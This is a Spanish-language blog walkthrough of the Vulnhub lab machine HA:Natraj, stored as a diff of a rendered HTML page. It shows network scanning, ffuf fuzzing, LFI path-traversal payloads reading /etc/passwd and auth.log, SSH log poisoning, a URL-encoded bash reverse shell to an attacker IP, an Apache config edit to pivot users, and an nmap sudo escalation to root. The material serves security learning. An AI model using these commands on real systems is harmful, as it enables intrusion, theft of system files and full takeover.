@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Guía de maquina Natraj | Blog de Nopalkat</title>
+    <meta name="generator" content="VuePress 1.9.10">
+    
+    <meta name="description" content="
+&gt; Es importante conocer en qué software de virtualización fue creada la maquina a atacar debido a que puede presentar incompatibilidad, en mi caso fue necesario utilizar VMware ya que con VirtualB ...">
+    
+    <link rel="preload" href="/assets/css/0.styles.9d98b504.css" as="style"><link rel="preload" href="/assets/js/app.c142dfbe.js" as="script"><link rel="preload" href="/assets/js/4.121998af.js" as="script"><link rel="preload" href="/assets/js/1.d0cc4e50.js" as="script"><link rel="preload" href="/assets/js/11.768d75bb.js" as="script"><link rel="prefetch" href="/assets/js/12.f57c9783.js"><link rel="prefetch" href="/assets/js/13.038e097a.js"><link rel="prefetch" href="/assets/js/14.32ed4859.js"><link rel="prefetch" href="/assets/js/15.2e6711cb.js"><link rel="prefetch" href="/assets/js/16.5e636cc5.js"><link rel="prefetch" href="/assets/js/17.f53c0d02.js"><link rel="prefetch" href="/assets/js/18.13190aa0.js"><link rel="prefetch" href="/assets/js/19.c71f1f52.js"><link rel="prefetch" href="/assets/js/2.9f69d038.js"><link rel="prefetch" href="/assets/js/3.0f322586.js"><link rel="prefetch" href="/assets/js/5.d4ac1a4f.js"><link rel="prefetch" href="/assets/js/6.7505aeea.js"><link rel="prefetch" href="/assets/js/7.88699a57.js"><link rel="prefetch" href="/assets/js/8.ca2393fc.js"><link rel="prefetch" href="/assets/js/vuejs-paginate.184d4148.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.9d98b504.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div id="vuepress-theme-blog__global-layout"><section id="header-wrapper"><header id="header"><div class="header-wrapper"><div class="title"><a href="/" class="nav-link home-link">Blog de Nopalkat </a></div> <div class="header-right-wrap"><ul class="nav"><li class="nav-item"><a href="/" class="nav-link">Blog</a></li><li class="nav-item"><a href="/tag/" class="nav-link">Tags</a></li></ul> <div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <!----></div></div></header></section> <div id="mobile-header"><div class="mobile-header-bar"><div class="mobile-header-title"><a href="/" class="nav-link mobile-home-link">Blog de Nopalkat </a> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div> <div class="mobile-menu-wrapper"><hr class="menu-divider"> <ul class="mobile-nav"><li class="mobile-nav-item"><a href="/" class="nav-link">Blog</a></li><li class="mobile-nav-item"><a href="/tag/" class="nav-link">Tags</a></li> <li class="mobile-nav-item"><!----></li></ul></div></div></div> <div class="content-wrapper"><div id="vuepress-theme-blog__post-layout"><article itemscope="itemscope" itemtype="https://schema.org/BlogPosting" class="vuepress-blog-theme-content"><header><h1 itemprop="name headline" class="post-title">
+        Guía de maquina Natraj
+      </h1> <div class="post-meta"><!----> <div class="post-meta-date"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg> <time pubdate itemprop="datePublished" datetime="2024-05-13T00:00:00.000Z">
+      Mon May 13 2024
+    </time></div> <ul itemprop="keywords" class="post-meta-tags"><li class="post-tag" data-v-42ccfcd5><a href="/tag/Vulnhub" data-v-42ccfcd5><span data-v-42ccfcd5>Vulnhub</span></a></li><li class="post-tag" data-v-42ccfcd5><a href="/tag/Hacking" data-v-42ccfcd5><span data-v-42ccfcd5>Hacking</span></a></li></ul></div></header> <div itemprop="articleBody" class="content__default"><h2 id="investigacion-previa-a-la-prueba-de-penetracion"><a href="#investigacion-previa-a-la-prueba-de-penetracion" class="header-anchor">#</a> Investigación previa a la prueba de penetración</h2> <blockquote><p>Es importante conocer en qué software de virtualización fue creada la maquina a atacar debido a que puede presentar incompatibilidad, en mi caso fue necesario utilizar VMware ya que con VirtualBox no podía conectarse a la red.
+El propio creador de la maquina sugiere usar este software de virtualización.
+<img src="/assets/img/infoprevia.7fb589bb.png" alt="Informacion previa"></p></blockquote> <h2 id="reconocimiento"><a href="#reconocimiento" class="header-anchor">#</a> Reconocimiento</h2> <h3 id="descubriendo-dispositivos-dentro-de-la-red"><a href="#descubriendo-dispositivos-dentro-de-la-red" class="header-anchor">#</a> descubriendo dispositivos dentro de la red</h3> <p>En esta maquina, no conocemos su IP de primera por lo que es necesario hacer un escaneo de red para conocer los dispositivos conectados a la red mediante uno de los siguientes comandos
+<strong>1.- Con nmap</strong></p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.1/24
+</code></pre></div><p><strong>2.- con netdiscover</strong></p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> netdiscover
+</code></pre></div><p><strong>3.- con arp-scan</strong></p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> arp-scan <span class="token parameter variable">--interface</span><span class="token operator">=</span>eth0 <span class="token parameter variable">--localnet</span>
+</code></pre></div><p>en cualquiera de los 3 casos podemos identificar la IP de la maquina victima debido a que tiene una dirección MAC de VMware o porque comparte la dirección MAC de la maquina anfitrión o maquina física (en mi caso un Windows 11)</p> <div class="language-ini extra-class"><pre class="language-ini"><code><span class="token key attr-name">❯ sudo arp-scan --interface</span><span class="token punctuation">=</span><span class="token value attr-value">eth0 --localnet</span>
+Interface: eth0, type: EN10MB, MAC: 08:00:27:93:dd:7b, IPv4: 192.168.0.18
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.0.1	   XX:XX:XX:XX:XX:XX	Cloud Network Technology (Samoa) Limited
+192.168.0.3	   XX:XX:XX:f3:d8:88	Intel Corporate
+192.168.0.4	   XX:XX:XX:XX:XX:XX	Qingdao Hisense Communications Co.,Ltd.
+192.168.0.5	   XX:XX:XX:XX:XX:XX	(Unknown: locally administered)
+192.168.0.21   XX:XX:XX:f3:d8:88	Intel Corporate
+192.168.0.20   XX:XX:XX:XX:XX:XX	(Unknown: locally administered)
+</code></pre></div><h3 id="descubrimiento-de-puertos-abiertos"><a href="#descubrimiento-de-puertos-abiertos" class="header-anchor">#</a> descubrimiento de puertos abiertos</h3> <p>Una vez identificada la dirección IP de la maquina victima, procedemos a hacer el primer escaneo para reconocer sus puertos abiertos:</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">sudo</span> nmap -p- <span class="token parameter variable">--open</span> <span class="token parameter variable">-sS</span> --min-rate <span class="token number">5000</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> <span class="token number">192.168</span>.0.21 <span class="token parameter variable">-oN</span> escaneo
+</code></pre></div><blockquote><p>Al usar -vvv nos reporta por consola los puertos abiertos durante el escaneo, por lo que sabiendo que servicios corren en esos puertos por defecto es posible adelantar algo de trabajo antes de que termine el escaneo</p></blockquote> <p>teniendo el siguiente resultado:</p> <div class="language-ini extra-class"><pre class="language-ini"><code>PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+MAC Address: F0:9E:4A:F3:D8:88 (Intel Corporate)
+</code></pre></div><h3 id="analizano-los-puertos-abiertos"><a href="#analizano-los-puertos-abiertos" class="header-anchor">#</a> analizano los puertos abiertos</h3> <p>Es posible que requiramos un segundo escaneo para reconocer los servicios y la versión de estos que corren por los puertos abiertos</p> <div class="language-bash extra-class"><pre class="language-bash"><code>nmap -p22,80 <span class="token parameter variable">-sCV</span> <span class="token number">192.168</span>.0.21 <span class="token parameter variable">-oN</span> puertos
+</code></pre></div><p>Tenemos el siguiente resultado:</p> <div class="language-ini extra-class"><pre class="language-ini"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d9:9f:da:f4:2e:67:01:92:d5:da:7f:70:d0:06:b3:92 (RSA)
+|   256 bc:ea:f1:3b:fa:7c:05:0c:92:95:92:e9:e7:d2:07:71 (ECDSA)
+|_  256 f0:24:5b:7a:3b:d6:b7:94:c4:4b:fe:57:21:f8:00:61 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: HA:Natraj
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>identificamos que por el puerto 80 está corriendo un servicio HTTP por lo que podemos intuir que el servidor alberga un sitio web:
+<img src="/assets/img/websitepreview.b44c5f5d.png" alt="Primeravista del sitio web"></p> <h3 id="enumeracion"><a href="#enumeracion" class="header-anchor">#</a> Enumeración</h3> <p>analizando el código fuente y demás parte del sitio, vemos que no hay nada interesante por lo que procedemos a hacer una enumeración de los directorios y archivos que se encuentran en el sitio web mediante <code>ffuf</code></p> <div class="language-bash extra-class"><pre class="language-bash"><code>ffuf <span class="token parameter variable">-c</span> <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> <span class="token string">&quot;http://192.168.0.21/FUZZ&quot;</span>
+</code></pre></div><p>descubrimos que tenemos acceso a los siguientes directorios:</p> <div class="language- extra-class"><pre class="language-text"><code>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.0.21/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+[---- mucho texto ---]
+images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 1518ms]
+console                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 148ms]
+                        [Status: 200, Size: 14497, Words: 1956, Lines: 183, Duration: 207ms]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 15ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 1117 req/sec :: Duration: [0:03:15] :: Errors: 0 ::
+
+</code></pre></div><p>dentro del directorio console vemos que hay un archivo php el cual a primera vista parece que no tiene nada:
+<img src="/assets/img/apartadoconsole.863cd43a.png" alt="Apartado console"></p> <p>Por lo que se procede a volver a enumerar con <code>ffuf</code> para encontrar parámetros validos del sitio web</p> <div class="language-bash extra-class"><pre class="language-bash"><code>ffuf <span class="token parameter variable">-c</span> <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> <span class="token string">&quot;http://192.168.0.21/console/file.php?FUZZ=../images/5.jpg&quot;</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">&quot;Words: 1&quot;</span>
+</code></pre></div><p>Para conocer el parámetro, es necesario enfocarse en el valor de un archivo que se encuientre dentro del servidor, en este caso me apoye de una de las imagenes del sitio web y obtuve el siguiente resultado:</p> <div class="language- extra-class"><pre class="language-text"><code>        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.0.21/console/file.php?FUZZ=../images/5.jpg
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+file                    [Status: 200, Size: 74239, Words: 259, Lines: 313, Duration: 50ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 813 req/sec :: Duration: [0:05:36] :: Errors: 0 ::
+</code></pre></div><blockquote><p>También usé <code>grep</code> para tener una mejor precisión en la búsqueda ya que de primera pareciera que todos los parámetros son validos</p></blockquote> <h2 id="analisis-de-vulneravilidades"><a href="#analisis-de-vulneravilidades" class="header-anchor">#</a> Analisis de vulneravilidades</h2> <p>Ahora haremos un tercer escaneo para enumerar los archivos que se encuentran en el servidor, ya que pareciera que es vulnerable a LFI
+Utilizaremos la misma herramienta para enumerar pero ahora con otro diccionario</p> <div class="language-bash extra-class"><pre class="language-bash"><code>ffuf <span class="token parameter variable">-c</span> <span class="token parameter variable">-w</span> /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ <span class="token parameter variable">-u</span> <span class="token string">&quot;http://192.168.0.21/console/file.php?file=FUZZ&quot;</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">&quot;Words: 1&quot;</span>
+</code></pre></div><h2 id="explotacion"><a href="#explotacion" class="header-anchor">#</a> Explotación</h2> <p>En efecto, es vulnerable a LFI</p> <div class="language- extra-class"><pre class="language-text"><code>        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.0.23/console/file.php?file=FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 270ms]
+/etc/apache2/apache2.conf [Status: 200, Size: 7224, Words: 942, Lines: 228, Duration: 52ms]
+/etc/apt/sources.list   [Status: 200, Size: 3018, Words: 310, Lines: 56, Duration: 55ms]
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 354ms]
+/etc/hosts.allow        [Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 35ms]
+/etc/issue              [Status: 200, Size: 24, Words: 5, Lines: 3, Duration: 2ms]
+/etc/passwd             [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 3ms]
+/../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 8ms]
+/./././././././././././etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 9ms]
+../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 10ms]
+../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 5ms]
+../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 51ms]
+../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 45ms]
+../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 2ms]
+../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 58ms]
+../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 43ms]
+../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 6ms]
+../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 66ms]
+../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 3ms]
+../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 2ms]
+../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 8ms]
+../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 5ms]
+../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 66ms]
+../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 6ms]
+../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 12ms]
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 122ms]
+../../../../etc/passwd  [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 156ms]
+../../../../../../etc/passwd&amp;=%3C%3C%3C%3C [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 81ms]
+../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 411ms]
+/etc/ssh/sshd_config    [Status: 200, Size: 3264, Words: 294, Lines: 123, Duration: 7ms]
+/etc/updatedb.conf      [Status: 200, Size: 403, Words: 42, Lines: 5, Duration: 17ms]
+/etc/resolv.conf        [Status: 200, Size: 701, Words: 96, Lines: 18, Duration: 109ms]
+/etc/rpc                [Status: 200, Size: 887, Words: 36, Lines: 41, Duration: 110ms]
+/proc/meminfo           [Status: 200, Size: 1335, Words: 489, Lines: 49, Duration: 3ms]
+/proc/loadavg           [Status: 200, Size: 25, Words: 5, Lines: 2, Duration: 4ms]
+/proc/self/status       [Status: 200, Size: 1291, Words: 92, Lines: 54, Duration: 2ms]
+/proc/net/route         [Status: 200, Size: 512, Words: 287, Lines: 5, Duration: 12ms]
+/proc/partitions        [Status: 200, Size: 116, Words: 51, Lines: 6, Duration: 15ms]
+/proc/net/dev           [Status: 200, Size: 446, Words: 254, Lines: 5, Duration: 17ms]
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 1074ms]
+/var/log/auth.log       [Status: 200, Size: 19619, Words: 2358, Lines: 207, Duration: 34ms]
+///////../../../etc/passwd [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 48ms]
+:: Progress: [922/922] :: Job [1/1] :: 48 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+</code></pre></div><p>Vemos que tenemos acceso a lectura de los registros de inicio de sesión del servicio SSH
+por lo que es posible escribirlo tratando de iniciar sesión</p> <p><img src="/assets/img/firstFLIssh.f0276fb2.png" alt="test de LFI con archivo auth"></p> <p>Y lo más importante, inyectar codigo PHP</p> <blockquote><p>Nota importante: es posible que no puedas inyectar codigo PHP ya que no puedes ingresar caracteres especiales para iniciar sesión al servicio ssh
+<img src="/assets/img/sshlogonkali.1a1d0cbb.png" alt="Log con kali">
+En mi caso tengo este error en Kali GNU/Linux, por lo que tuve que usar otros dispositivos
+como en este caso Ubuntu corriendo en WSL:
+<img src="/assets/img/sshlogonWSL.07e73e6d.png" alt="Log con Ubuntu en WSL"></p></blockquote> <p>Usando el usuario para inyectar código PHP tenemos los siguientes resultados visibles en el sitio web:
+<img src="/assets/img/logpoissonigtest.73d9ec1d.png" alt="test de log poissonig"></p> <p>Se logró un logpoissonig del archivo auth.log ejecutando el comando &quot;id&quot;, ahora desde un web shell, entablamos una conexión a la maquina atacante mediante una reverse shell codificado a URL de la siguiente manera:</p> <div class="language-ini extra-class"><pre class="language-ini"><code>bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.24%2f443%200%3E%261%22
+</code></pre></div><p>nos ponemos en escucha con el siguiente comando:</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-nlvp</span> <span class="token punctuation">[</span>Puerto Atacante<span class="token punctuation">]</span>
+</code></pre></div><p>y ejecutamos el comando bash en el navegador
+<img src="/assets/img/reverseshell.98746a71.png" alt="Reverse shell"></p> <p>vemos que se queda trabado y no responde, lo que significa que hemos entablado conexión con la maquina victima</p> <div class="language- extra-class"><pre class="language-text"><code>❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [192.168.0.24] from (UNKNOWN) [192.168.0.23] 39602
+bash: cannot set terminal process group (580): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/html/console$ cd
+cd
+bash: cd: HOME not set
+www-data@ubuntu:/var/www/html/console$ ls
+ls
+file.php
+www-data@ubuntu:/var/www/html/console$ cat file php
+cat file php
+cat: file: No such file or directory
+cat: php: No such file or directory
+www-data@ubuntu:/var/www/html/console$ cat file.php
+cat file.php
+&lt;?php
+   $file = $_GET['file'];
+   if(isset($file))
+   {
+       include(&quot;$file&quot;);
+   }
+   else
+   {
+       include(&quot;index.php&quot;);
+   }
+   ?&gt;
+www-data@ubuntu:/var/www/html/console$ 
+</code></pre></div><h2 id="tratamiento-de-la-tty"><a href="#tratamiento-de-la-tty" class="header-anchor">#</a> Tratamiento de la TTY</h2> <p>procedemos a hacer un tratamiento de la TTY para tener una consola aun más interactiva
+en la maquina victima</p> <div class="language-ini extra-class"><pre class="language-ini"><code>script /dev/null -c bash
+</code></pre></div><p>precionamos Ctrl + z para suspender el proceso
+y en nuestramaquina colocamos el siguiente comando</p> <div class="language-bash extra-class"><pre class="language-bash"><code>stty raw -echo<span class="token punctuation">;</span> <span class="token function">fg</span>
+</code></pre></div><p>lo que nos permite retomar el proceso
+pero ahora escribimos <code>reset</code> para reiniciar la terminal de la maquina victima y procedemos a preparara para hacerlo más comodo</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>bash
+</code></pre></div><p>y ajustamos la resulución de la terminal de la siguiente manera:</p> <div class="language-bash extra-class"><pre class="language-bash"><code>stty rows XX columns XXX
+</code></pre></div><blockquote><p>para conocer las dimenciones de tu terminal puedes digitar <code>stty size</code> <img src="/assets/img/sttysize.3a2311ec.png" alt="stty size"></p></blockquote> <p>ahora tenemos una terminal más interactiva:
+<img src="/assets/img/maquinavictima.cb82067a.png" alt="Maquina victima"></p> <h2 id="escalada-de-privilegios"><a href="#escalada-de-privilegios" class="header-anchor">#</a> Escalada de privilegios</h2> <h3 id="user-pivoting"><a href="#user-pivoting" class="header-anchor">#</a> User pivoting</h3> <p>dentro del servidor, buscamos los archivos a los que tengamos capacidad de escritura:</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token function">find</span> / <span class="token parameter variable">-writable</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
+</code></pre></div><p>viendo que algo interesante está en la siguiente ruta</p> <div class="language- extra-class"><pre class="language-text"><code>/etc/apache2/apache2.conf
+</code></pre></div><p>lo abrimos con nano y editamos el archivo para que el cuando se reinicie la maquina, el servicio corra como uno de los usuarios que se encuentra en el servidor
+antes:</p> <div class="language-ini extra-class"><pre class="language-ini"><code><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">----mucho texto---</span><span class="token punctuation">]</span></span>
+<span class="token comment"># KeepAliveTimeout: Number of seconds to wait for the next request from the</span>
+<span class="token comment"># same client on the same connection.</span>
+<span class="token comment">#</span>
+KeepAliveTimeout 5
+
+<span class="token comment"># These need to be set in /etc/apache2/envvars</span>
+User ${APACHE_RUN_USER}
+Group ${APACHE_RUN_GROUP}
+
+<span class="token comment">#</span>
+<span class="token comment"># HostnameLookups: Log the names of clients or just their IP addresses</span>
+<span class="token comment"># e.g., www.apache.org (on) or 204.62.129.132 (off).</span>
+<span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">----mas texto---</span><span class="token punctuation">]</span></span>
+</code></pre></div><p>editado:</p> <div class="language-ini extra-class"><pre class="language-ini"><code><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">----mucho texto---</span><span class="token punctuation">]</span></span>
+KeepAliveTimeout 5
+
+
+<span class="token comment"># These need to be set in /etc/apache2/envvars</span>
+User mahakal
+Group mahakal
+
+<span class="token comment">#</span>
+<span class="token comment"># HostnameLookups: Log the names of clients or just their IP addresses</span>
+<span class="token comment"># e.g., www.apache.org (on) or 204.62.129.132 (off).</span>
+<span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">----mas texto---</span><span class="token punctuation">]</span></span>
+</code></pre></div><p>ahora reiniciamos la maquina de la forma más realista posible...</p> <p>ahora vemos como corre el servicio http
+<img src="/assets/img/userpivoting.4254bb81.png" alt="User pivoting"></p> <p>por lo que al ingresar con una reverse shell, será como ese usuario
+<img src="/assets/img/secondreverseshell.b7747beb.png" alt="Segunda reverse shell"></p> <h3 id="escalando-a-superusuario"><a href="#escalando-a-superusuario" class="header-anchor">#</a> Escalando a superusuario</h3> <p>verificamos los permisos que tenemos mediante <code>sudo -l</code> <img src="/assets/img/permision.413796fd.png" alt="Permisos como sudo"></p> <p>vemos que podemos ejecutar nmap como sudo, por lo que utilizando la guia de GTFobins vemos como escalar privilegios como supe usuario de la siguiente manera:</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp<span class="token variable">)</span></span>
+<span class="token builtin class-name">echo</span> <span class="token string">'os.execute(&quot;/bin/sh&quot;)'</span> <span class="token operator">&gt;</span> <span class="token variable">$TF</span>
+<span class="token function">sudo</span> nmap <span class="token parameter variable">--script</span><span class="token operator">=</span><span class="token variable">$TF</span>
+</code></pre></div><blockquote><p>Fuente https://gtfobins.github.io/gtfobins/nmap/#shell</p></blockquote> <p><img src="/assets/img/privilegiescalation.bcd3d18e.png" alt="Escalada de privilegios"></p> <p>ahora buscamos la flag y la maquina estaria totalmente vulnerada:
+<img src="/assets/img/flagroot.0a82779f.png" alt="Flag de root"></p> <blockquote><p>medio confuso que no se vea lo que uno está escribiendo y que los saltos de linea sean en horizontal pero es posible todavía poder utilizar algunos atajos de teclado para mejor presentación</p></blockquote> <p><img src="/assets/img/final.f4fee090.png" alt="Final"></p></div> <footer><!----> <hr> <!----></footer></article> <div class="sticker vuepress-toc"><div class="vuepress-toc-item vuepress-toc-h2 active"><a href="#investigacion-previa-a-la-prueba-de-penetracion" title="Investigación previa a la prueba de penetración">Investigación previa a la prueba de penetración</a></div><div class="vuepress-toc-item vuepress-toc-h2"><a href="#reconocimiento" title="Reconocimiento">Reconocimiento</a></div><div class="vuepress-toc-item vuepress-toc-h3"><a href="#descubriendo-dispositivos-dentro-de-la-red" title="descubriendo dispositivos dentro de la red">descubriendo dispositivos dentro de la red</a></div><div class="vuepress-toc-item vuepress-toc-h3"><a href="#descubrimiento-de-puertos-abiertos" title="descubrimiento de puertos abiertos">descubrimiento de puertos abiertos</a></div><div class="vuepress-toc-item vuepress-toc-h3"><a href="#analizano-los-puertos-abiertos" title="analizano los puertos abiertos">analizano los puertos abiertos</a></div><div class="vuepress-toc-item vuepress-toc-h3"><a href="#enumeracion" title="Enumeración">Enumeración</a></div><div class="vuepress-toc-item vuepress-toc-h2"><a href="#analisis-de-vulneravilidades" title="Analisis de vulneravilidades">Analisis de vulneravilidades</a></div><div class="vuepress-toc-item vuepress-toc-h2"><a href="#explotacion" title="Explotación">Explotación</a></div><div class="vuepress-toc-item vuepress-toc-h2"><a href="#tratamiento-de-la-tty" title="Tratamiento de la TTY">Tratamiento de la TTY</a></div><div class="vuepress-toc-item vuepress-toc-h2"><a href="#escalada-de-privilegios" title="Escalada de privilegios">Escalada de privilegios</a></div><div class="vuepress-toc-item vuepress-toc-h3"><a href="#user-pivoting" title="User pivoting">User pivoting</a></div><div class="vuepress-toc-item vuepress-toc-h3"><a href="#escalando-a-superusuario" title="Escalando a superusuario">Escalando a superusuario</a></div></div></div></div> <footer class="footer" data-v-3d9deeb8><div class="footer-left-wrap" data-v-3d9deeb8><ul class="contact" data-v-3d9deeb8></ul></div> <div class="footer-right-wrap" data-v-3d9deeb8><ul class="copyright" data-v-3d9deeb8></ul></div></footer></div><div class="global-ui"></div></div>
+    <script src="/assets/js/app.c142dfbe.js" defer></script><script src="/assets/js/4.121998af.js" defer></script><script src="/assets/js/1.d0cc4e50.js" defer></script><script src="/assets/js/11.768d75bb.js" defer></script>
+  </body>
+</html>
